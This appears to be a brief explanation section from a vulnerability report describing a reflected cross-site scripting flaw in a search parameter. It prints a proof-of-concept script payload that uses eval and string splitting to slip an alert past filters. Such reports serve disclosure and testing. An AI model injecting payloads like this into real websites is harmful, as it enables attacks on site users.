Explaination
============

-   The search parameter is vulnerable to reflected XSS.
-   The payload `<script>eval("a"+"lert('xss_by_sam_tan')")</script>` is
    injected into the search parameter.
-   When the search results are displayed, the script is executed,
    displaying an alert box with the message `xss_by_sam_tan`.
